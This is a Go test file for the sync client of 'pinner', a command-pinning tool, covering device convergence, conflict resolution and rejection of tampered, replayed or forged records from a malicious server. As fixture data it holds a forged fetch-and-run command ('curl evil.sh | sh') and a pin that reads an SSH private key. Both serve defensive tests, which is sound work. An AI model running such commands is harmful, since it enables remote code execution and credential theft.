package syncer

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/osean-man/pinner/internal/database"
	"github.com/osean-man/pinner/internal/server"
	"github.com/osean-man/pinner/internal/synccrypto"
)

type env struct {
	t      *testing.T
	srv    *httptest.Server
	server *server.Store
	secret string
}

func newEnv(t *testing.T) *env {
	t.Helper()
	st, err := server.OpenStore(filepath.Join(t.TempDir(), "server.db"))
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(server.NewHandler(st, server.Options{}))
	t.Cleanup(func() { srv.Close(); _ = st.Close() })
	raw, err := synccrypto.GenerateSecret()
	if err != nil {
		t.Fatal(err)
	}
	return &env{t: t, srv: srv, server: st, secret: synccrypto.EncodeSecret(raw)}
}

type device struct {
	t      *testing.T
	store  *database.Store
	client *Client
}

func (e *env) device(name string) *device {
	e.t.Helper()
	store, err := database.Open(filepath.Join(e.t.TempDir(), name+".db"))
	if err != nil {
		e.t.Fatal(err)
	}
	e.t.Cleanup(func() { _ = store.Close() })
	c, err := NewClient(Config{Server: e.srv.URL, Secret: e.secret})
	if err != nil {
		e.t.Fatal(err)
	}
	if err := c.Register(context.Background()); err != nil {
		e.t.Fatal(err)
	}
	return &device{t: e.t, store: store, client: c}
}

func (d *device) sync() Result {
	d.t.Helper()
	res, err := Sync(context.Background(), d.store, d.client)
	if err != nil {
		d.t.Fatal(err)
	}
	return res
}

func (d *device) add(cmd string) database.Pin {
	d.t.Helper()
	p, err := d.store.Add(database.NewPin{Command: cmd})
	if err != nil {
		d.t.Fatal(err)
	}
	return p
}

func (d *device) commands() []string {
	d.t.Helper()
	pins, err := d.store.List("")
	if err != nil {
		d.t.Fatal(err)
	}
	var out []string
	for _, p := range pins {
		out = append(out, p.Command)
	}
	return out
}

func (d *device) find(cmd string) database.Pin {
	d.t.Helper()
	pins, _ := d.store.List("")
	for _, p := range pins {
		if p.Command == cmd {
			return p
		}
	}
	d.t.Fatalf("pin %q not found in %v", cmd, d.commands())
	return database.Pin{}
}

func sameSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	m := map[string]int{}
	for _, x := range a {
		m[x]++
	}
	for _, x := range b {
		m[x]--
	}
	for _, v := range m {
		if v != 0 {
			return false
		}
	}
	return true
}

func TestTwoDevicesConverge(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	a.add("echo from-a")
	a.add("kubectl get pods")
	if res := a.sync(); res.Pushed != 2 {
		t.Fatalf("pushed %d, want 2", res.Pushed)
	}
	b.add("echo from-b")
	b.sync()
	a.sync()

	want := []string{"echo from-a", "kubectl get pods", "echo from-b"}
	if !sameSet(a.commands(), want) || !sameSet(b.commands(), want) {
		t.Fatalf("not converged:\n a=%v\n b=%v", a.commands(), b.commands())
	}

	// A second sync with no changes moves nothing.
	if res := a.sync(); res.Pushed != 0 || res.Received != 0 {
		t.Fatalf("idle sync did work: %+v", res)
	}
}

func TestEditsAndMetadataPropagate(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	p := a.add("ssh host")
	a.sync()
	b.sync()

	cmd, label, tags, sens := "ssh -A host", "jump box", []string{"ops"}, true
	if _, err := a.store.Update(p.ID, database.PinUpdate{Command: &cmd, Label: &label, Tags: &tags, Sensitive: &sens}); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()
	got := b.find("ssh -A host")
	if got.Label != "jump box" || !got.Sensitive || len(got.Tags) != 1 || got.Tags[0] != "ops" {
		t.Fatalf("metadata did not sync: %+v", got)
	}
}

func TestConcurrentEditLastWriterWins(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	p := a.add("echo original")
	a.sync()
	b.sync()
	pb := b.find("echo original")

	base := time.Now()
	a.store.SetNow(func() time.Time { return base.Add(1 * time.Minute) })
	b.store.SetNow(func() time.Time { return base.Add(2 * time.Minute) }) // b edits later
	ca, cb := "echo edited-on-a", "echo edited-on-b"
	if _, err := a.store.Update(p.ID, database.PinUpdate{Command: &ca}); err != nil {
		t.Fatal(err)
	}
	if _, err := b.store.Update(pb.ID, database.PinUpdate{Command: &cb}); err != nil {
		t.Fatal(err)
	}
	// Order of syncing must not matter.
	b.sync()
	a.sync()
	b.sync()
	for name, d := range map[string]*device{"a": a, "b": b} {
		if got := d.commands(); len(got) != 1 || got[0] != cb {
			t.Fatalf("device %s has %v, want only %q", name, got, cb)
		}
	}
}

func TestDeletePropagatesAndStaysDeleted(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	p := a.add("echo doomed")
	a.add("echo keeper")
	a.sync()
	b.sync()

	if err := a.store.Remove(p.ID); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()
	if got := b.commands(); len(got) != 1 || got[0] != "echo keeper" {
		t.Fatalf("delete did not propagate: %v", got)
	}
	// A device that joins later never sees it.
	c := e.device("c")
	c.sync()
	if got := c.commands(); len(got) != 1 || got[0] != "echo keeper" {
		t.Fatalf("new device resurrected a deleted pin: %v", got)
	}
}

func serverBlobs(t *testing.T, st *server.Store) [][]byte {
	t.Helper()
	rows, err := st.DB().Query("SELECT blob FROM records")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = rows.Close() }()
	var out [][]byte
	for rows.Next() {
		var b []byte
		if err := rows.Scan(&b); err != nil {
			t.Fatal(err)
		}
		out = append(out, b)
	}
	return out
}

func TestServerNeverSeesPlaintext(t *testing.T) {
	e := newEnv(t)
	a := e.device("a")
	if _, err := a.store.Add(database.NewPin{Command: "curl -H 'X-API-KEY: hunter2-very-secret'", Label: "prod api", Tags: []string{"secret-tag"}}); err != nil {
		t.Fatal(err)
	}
	a.sync()
	raw, err := os.ReadFile(filepath.Join(filepath.Dir(e.serverPath(t)), "server.db"))
	if err != nil {
		t.Fatal(err)
	}
	for _, needle := range []string{"hunter2", "prod api", "secret-tag", "curl"} {
		if bytes.Contains(raw, []byte(needle)) {
			t.Fatalf("server database contains plaintext %q", needle)
		}
		for _, b := range serverBlobs(t, e.server) {
			if bytes.Contains(b, []byte(needle)) {
				t.Fatalf("blob contains plaintext %q", needle)
			}
		}
	}
}

func (e *env) serverPath(t *testing.T) string {
	t.Helper()
	var file string
	if err := e.server.DB().QueryRow("SELECT file FROM pragma_database_list WHERE name = 'main'").Scan(&file); err != nil {
		t.Fatal(err)
	}
	// Flush WAL into the main file so the raw-bytes check sees everything.
	if _, err := e.server.DB().Exec("PRAGMA wal_checkpoint(TRUNCATE)"); err != nil {
		t.Fatal(err)
	}
	return file
}

func TestLocalPinsNeverLeaveTheDevice(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	if _, err := a.store.Add(database.NewPin{Command: "cat ~/.ssh/work_key", Local: true}); err != nil {
		t.Fatal(err)
	}
	shared := a.add("echo shared")
	a.sync()
	if n := len(serverBlobs(t, e.server)); n != 1 {
		t.Fatalf("server holds %d records, want 1 (the local pin must not be uploaded)", n)
	}
	b.sync()
	if got := b.commands(); len(got) != 1 || got[0] != "echo shared" {
		t.Fatalf("device b got %v", got)
	}

	// Making a synced pin local removes it from other devices but keeps it here.
	local := true
	if _, err := a.store.Update(shared.ID, database.PinUpdate{Local: &local}); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()
	if got := b.commands(); len(got) != 0 {
		t.Fatalf("pin made local should disappear from b, got %v", got)
	}
	if got := a.commands(); len(got) != 2 {
		t.Fatalf("device a should keep both pins, got %v", got)
	}
}

func TestJoiningWithOverlappingPinsDoesNotDuplicate(t *testing.T) {
	e := newEnv(t)
	a := e.device("a")
	a.add("git status")
	a.add("only on a")
	a.sync()

	b := e.device("b")
	b.add("git status")
	b.add("only on b")
	b.sync()
	a.sync()

	want := []string{"git status", "only on a", "only on b"}
	if !sameSet(a.commands(), want) || !sameSet(b.commands(), want) {
		t.Fatalf("after join:\n a=%v\n b=%v", a.commands(), b.commands())
	}
	if a.find("git status").UUID != b.find("git status").UUID {
		t.Fatal("the shared pin should end up with one identity")
	}
}

func TestPullPaginatesLargeAccounts(t *testing.T) {
	e := newEnv(t)
	a := e.device("a")
	for i := 0; i < 1100; i++ {
		a.add(fmt.Sprintf("echo %d", i))
	}
	a.sync()
	b := e.device("b")
	res := b.sync()
	if res.Received != 1100 || len(b.commands()) != 1100 {
		t.Fatalf("received %d, have %d pins, want 1100", res.Received, len(b.commands()))
	}
}

// The tamper tests act as a malicious server by editing its database directly.

func tamperSetup(t *testing.T) (*env, *device, *device) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	a.add("echo first")
	a.add("echo second")
	a.sync()
	b.sync()
	return e, a, b
}

func bumpAll(t *testing.T, st *server.Store) {
	t.Helper()
	// Give every record a fresh seq so clients pull them again.
	if _, err := st.DB().Exec("UPDATE records SET seq = seq + 1000"); err != nil {
		t.Fatal(err)
	}
}

func TestTamperedBlobIsRejected(t *testing.T) {
	e, _, b := tamperSetup(t)
	if _, err := e.server.DB().Exec("UPDATE records SET blob = CAST(blob AS BLOB) || x'00'"); err != nil {
		t.Fatal(err)
	}
	bumpAll(t, e.server)
	before := b.commands()
	res := b.sync()
	if len(res.Rejected) != 2 || res.Applied != 0 {
		t.Fatalf("expected both records rejected, got %+v", res)
	}
	if !sameSet(b.commands(), before) {
		t.Fatalf("tampered records changed local pins: %v", b.commands())
	}
}

func TestBlobMovedToAnotherSlotIsRejected(t *testing.T) {
	e, a, b := tamperSetup(t)
	ridFirst := a.client.Keys().RecordID(a.find("echo first").UUID)
	ridSecond := a.client.Keys().RecordID(a.find("echo second").UUID)
	if _, err := e.server.DB().Exec("UPDATE records SET blob = (SELECT blob FROM records WHERE record_id = ?) WHERE record_id = ?", ridFirst, ridSecond); err != nil {
		t.Fatal(err)
	}
	bumpAll(t, e.server)
	res := b.sync()
	if len(res.Rejected) != 1 {
		t.Fatalf("swapped blob should be rejected, got %+v", res)
	}
	if !sameSet(b.commands(), []string{"echo first", "echo second"}) {
		t.Fatalf("swap changed local state: %v", b.commands())
	}
}

func TestReplayedOldVersionIsIgnored(t *testing.T) {
	e, a, b := tamperSetup(t)
	p := a.find("echo first")
	rid := a.client.Keys().RecordID(p.UUID)
	var oldBlob []byte
	if err := e.server.DB().QueryRow("SELECT blob FROM records WHERE record_id = ?", rid).Scan(&oldBlob); err != nil {
		t.Fatal(err)
	}
	cmd := "echo first v2"
	if _, err := a.store.Update(p.ID, database.PinUpdate{Command: &cmd}); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()

	// The server replays the old (validly encrypted) version.
	if _, err := e.server.DB().Exec("UPDATE records SET blob = ?, seq = 9999 WHERE record_id = ?", oldBlob, rid); err != nil {
		t.Fatal(err)
	}
	res := b.sync()
	if res.Applied != 0 {
		t.Fatalf("replayed old version was applied: %+v", res)
	}
	if !sameSet(b.commands(), []string{"echo first v2", "echo second"}) {
		t.Fatalf("replay rolled back b: %v", b.commands())
	}
	// b noticed the stale version and restored the newest one, so new devices get v2.
	c := e.device("c")
	c.sync()
	if !sameSet(c.commands(), []string{"echo first v2", "echo second"}) {
		t.Fatalf("new device got replayed state: %v", c.commands())
	}
}

func TestForgedRecordFromAnotherAccountIsRejected(t *testing.T) {
	e, a, b := tamperSetup(t)
	// The server operator has their own account and encrypts a malicious pin with their key.
	evilSecret, _ := synccrypto.GenerateSecret()
	evil, _ := synccrypto.DeriveKeys(evilSecret)
	rid := a.client.Keys().RecordID("6b0d3c3e-0000-4000-8000-000000000000")
	blob, err := evil.Seal(rid, []byte(`{"v":1,"uuid":"6b0d3c3e-0000-4000-8000-000000000000","command":"curl evil.sh | sh","hlc":"ffffffffffffffff.00000000.x"}`))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := e.server.DB().Exec("INSERT INTO records(user_id, record_id, seq, blob, updated_at) VALUES (?, ?, 99999, ?, 0)", a.client.Keys().UserID, rid, blob); err != nil {
		t.Fatal(err)
	}
	res := b.sync()
	if len(res.Rejected) != 1 {
		t.Fatalf("forged record not rejected: %+v", res)
	}
	for _, c := range b.commands() {
		if c == "curl evil.sh | sh" {
			t.Fatal("forged command reached the device")
		}
	}
}

func TestUnreachableServerFailsFast(t *testing.T) {
	// A server that accepts connections but never answers.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = ln.Close() }()
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			defer func() { _ = conn.Close() }()
		}
	}()

	store, err := database.Open(filepath.Join(t.TempDir(), "x.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()
	if _, err := store.Add(database.NewPin{Command: "echo x"}); err != nil {
		t.Fatal(err)
	}
	raw, _ := synccrypto.GenerateSecret()
	c, err := NewClient(Config{Server: "http://" + ln.Addr().String(), Secret: synccrypto.EncodeSecret(raw)})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	start := time.Now()
	if _, err := Sync(ctx, store, c); err == nil {
		t.Fatal("expected an error")
	}
	if elapsed := time.Since(start); elapsed > 2*time.Second {
		t.Fatalf("sync took %v despite a 300ms deadline", elapsed)
	}
	if dirty, _ := store.Dirty(); len(dirty) != 1 {
		t.Fatal("a failed push must leave the pin dirty for the next attempt")
	}
}

func TestValidateServerURL(t *testing.T) {
	t.Setenv(EnvAllowInsecure, "")
	ok := map[string]string{
		"https://pins.example.com/":    "https://pins.example.com",
		"https://pins.example.com/api": "https://pins.example.com/api",
		"http://localhost:8080":        "http://localhost:8080",
		"http://127.0.0.1:9000/":       "http://127.0.0.1:9000",
		"http://[::1]:9000":            "http://[::1]:9000",
	}
	for in, want := range ok {
		got, err := ValidateServerURL(in)
		if err != nil || got != want {
			t.Errorf("ValidateServerURL(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"http://pins.example.com", "ftp://x", "pins.example.com", ""} {
		if _, err := ValidateServerURL(bad); err == nil {
			t.Errorf("ValidateServerURL(%q) should fail", bad)
		}
	}
	t.Setenv(EnvAllowInsecure, "1")
	if _, err := ValidateServerURL("http://10.0.0.5:8080"); err != nil {
		t.Errorf("override should allow insecure: %v", err)
	}
}

func TestConfigIsOwnerOnly(t *testing.T) {
	dir := t.TempDir()
	if c, err := LoadConfig(dir); c != nil || err != nil {
		t.Fatalf("missing config should be nil, nil; got %v, %v", c, err)
	}
	if err := SaveConfig(dir, Config{Server: "https://x", Secret: "s"}); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(filepath.Join(dir, configFile))
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Fatalf("config mode %o, want 600", info.Mode().Perm())
	}
	c, err := LoadConfig(dir)
	if err != nil || c.Server != "https://x" || c.Secret != "s" {
		t.Fatalf("round trip: %+v %v", c, err)
	}
	if err := RemoveConfig(dir); err != nil {
		t.Fatal(err)
	}
	if err := RemoveConfig(dir); err != nil {
		t.Fatal("removing a missing config should be a no-op")
	}
}

func TestStaleOverwriteOnServerSelfHeals(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	p := a.add("echo original")
	a.sync()
	b.sync()
	pb := b.find("echo original")

	base := time.Now()
	a.store.SetNow(func() time.Time { return base.Add(1 * time.Minute) })
	b.store.SetNow(func() time.Time { return base.Add(2 * time.Minute) })
	ca, cb := "echo older-edit", "echo newer-edit"
	if _, err := a.store.Update(p.ID, database.PinUpdate{Command: &ca}); err != nil {
		t.Fatal(err)
	}
	if _, err := b.store.Update(pb.ID, database.PinUpdate{Command: &cb}); err != nil {
		t.Fatal(err)
	}
	b.sync()
	// Race: a pulled just before b pushed, so a's push lands on top of b's newer version.
	var res Result
	if err := push(context.Background(), a.store, a.client, &res); err != nil {
		t.Fatal(err)
	}

	b.sync() // b sees the stale version and re-asserts its own
	a.sync()
	fresh := e.device("fresh")
	fresh.sync()
	for name, d := range map[string]*device{"a": a, "b": b, "fresh": fresh} {
		if got := d.commands(); len(got) != 1 || got[0] != cb {
			t.Fatalf("device %s has %v, want only %q", name, got, cb)
		}
	}
}

// snapshot copies the server's records, standing in for a backup of its database.
func snapshot(t *testing.T, st *server.Store) [][]any {
	t.Helper()
	rows, err := st.DB().Query("SELECT user_id, record_id, seq, blob, updated_at FROM records")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = rows.Close() }()
	var out [][]any
	for rows.Next() {
		var uid, rid string
		var seq, upd int64
		var blob []byte
		if err := rows.Scan(&uid, &rid, &seq, &blob, &upd); err != nil {
			t.Fatal(err)
		}
		out = append(out, []any{uid, rid, seq, blob, upd})
	}
	return out
}

func TestServerRestoredFromOlderBackupConverges(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	a.add("echo before-backup")
	a.sync()
	b.sync()
	backup := snapshot(t, e.server)

	// Activity after the backup: cursors move past what the backup holds.
	a.add("echo after-backup-1")
	a.add("echo after-backup-2")
	a.sync()
	b.sync()

	// The operator restores the old backup.
	if _, err := e.server.DB().Exec("DELETE FROM records"); err != nil {
		t.Fatal(err)
	}
	for _, r := range backup {
		if _, err := e.server.DB().Exec("INSERT INTO records(user_id, record_id, seq, blob, updated_at) VALUES (?, ?, ?, ?, ?)", r...); err != nil {
			t.Fatal(err)
		}
	}

	// New writes now get low seq numbers. Without detection, b's cursor would skip them forever.
	b.add("echo after-restore")
	b.sync()
	a.sync()
	b.sync()
	fresh := e.device("fresh")
	fresh.sync()
	want := []string{"echo before-backup", "echo after-backup-1", "echo after-backup-2", "echo after-restore"}
	for name, d := range map[string]*device{"a": a, "b": b, "fresh": fresh} {
		if got := d.commands(); !sameSet(got, want) {
			t.Fatalf("device %s has %v, want %v", name, got, want)
		}
	}
}

func TestServerWipedDevicesReupload(t *testing.T) {
	e := newEnv(t)
	a, b := e.device("a"), e.device("b")
	a.add("echo one")
	gone := a.add("echo removed")
	a.sync()
	b.add("echo two")
	b.sync()
	if err := a.store.Remove(gone.ID); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()

	// The server loses everything, including the account.
	if _, err := e.server.DB().Exec("DELETE FROM records; DELETE FROM users;"); err != nil {
		t.Fatal(err)
	}
	a.sync()
	b.sync()
	fresh := e.device("fresh")
	fresh.sync()
	want := []string{"echo one", "echo two"}
	for name, d := range map[string]*device{"a": a, "b": b, "fresh": fresh} {
		if got := d.commands(); !sameSet(got, want) {
			t.Fatalf("device %s has %v, want %v", name, got, want)
		}
	}
}

func TestWrongTokenIsNotMistakenForAWipedServer(t *testing.T) {
	e := newEnv(t)
	a := e.device("a")
	a.add("echo mine")
	a.sync()

	// Another account's secret, but the server says that user id exists with a different token:
	// simulate by changing the stored hash for a's account.
	if _, err := e.server.DB().Exec("UPDATE users SET auth_hash = x'00'"); err != nil {
		t.Fatal(err)
	}
	if _, err := Sync(context.Background(), a.store, a.client); err == nil {
		t.Fatal("a token mismatch must surface as an error")
	}
	if n := len(serverBlobs(t, e.server)); n != 1 {
		t.Fatalf("server records changed after a rejected sync: %d", n)
	}
}
